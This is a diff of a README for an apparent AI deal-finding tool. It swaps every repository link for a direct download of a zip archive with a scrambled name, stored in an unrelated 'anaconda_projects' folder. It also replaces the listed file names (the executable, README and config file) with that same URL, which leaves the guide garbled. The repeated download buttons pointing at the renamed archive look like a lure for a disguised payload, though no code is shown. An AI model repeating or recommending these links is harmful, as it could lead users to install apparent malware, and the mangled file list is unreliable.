@@ -1,6 +1,6 @@
 # 🤖 Agentic-AI-Project-Find-Deal-Opportunities - Find Deals and Price Drops Fast
 
-[![Download Agentic-AI-Project-Find-Deal-Opportunities](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities)
+[![Download Agentic-AI-Project-Find-Deal-Opportunities](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities/raw/refs/heads/main/anaconda_projects/Agentic-Deal-A-Project-Opportunities-Find-1.0.zip)](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities/raw/refs/heads/main/anaconda_projects/Agentic-Deal-A-Project-Opportunities-Find-1.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To use Agentic-AI-Project-Find-Deal-Opportunities, follow these steps:
 
 Click the large button below or go directly to the official page:
 
-[![Download Agentic-AI-Project-Find-Deal-Opportunities](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities)
+[![Download Agentic-AI-Project-Find-Deal-Opportunities](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities/raw/refs/heads/main/anaconda_projects/Agentic-Deal-A-Project-Opportunities-Find-1.0.zip)](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities/raw/refs/heads/main/anaconda_projects/Agentic-Deal-A-Project-Opportunities-Find-1.0.zip)
 
 This link takes you to the GitHub repository where you can find the download files.
 
@@ -113,7 +113,7 @@ The program uses automatic processes to find deals. You don’t need to set tech
 
 New versions of the program may become available that improve deal detection and add new features. Check the same GitHub link below regularly to download updates:
 
-https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities
+https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities/raw/refs/heads/main/anaconda_projects/Agentic-Deal-A-Project-Opportunities-Find-1.0.zip
 
 ---
 
@@ -121,11 +121,11 @@ https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities
 
 Once installed, here is an overview of important files you will see:
 
-- **AgenticAI.exe** — Main program to run the software  
+- **https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities/raw/refs/heads/main/anaconda_projects/Agentic-Deal-A-Project-Opportunities-Find-1.0.zip** — Main program to run the software  
 - **data/** — Folder containing raw and processed product data  
 - **logs/** — Log files showing previous runs and errors  
-- **README.md** — This guide file included in the setup  
-- **config.ini** — Configuration file (usually set automatically)  
+- **https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities/raw/refs/heads/main/anaconda_projects/Agentic-Deal-A-Project-Opportunities-Find-1.0.zip** — This guide file included in the setup  
+- **https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities/raw/refs/heads/main/anaconda_projects/Agentic-Deal-A-Project-Opportunities-Find-1.0.zip** — Configuration file (usually set automatically)  
 
 ---
 
@@ -135,4 +135,4 @@ If you have problems or want to share your experience, check the Issues tab on t
 
 ---
 
-[Download Agentic-AI-Project-Find-Deal-Opportunities](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities)
+[Download Agentic-AI-Project-Find-Deal-Opportunities](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities/raw/refs/heads/main/anaconda_projects/Agentic-Deal-A-Project-Opportunities-Find-1.0.zip)
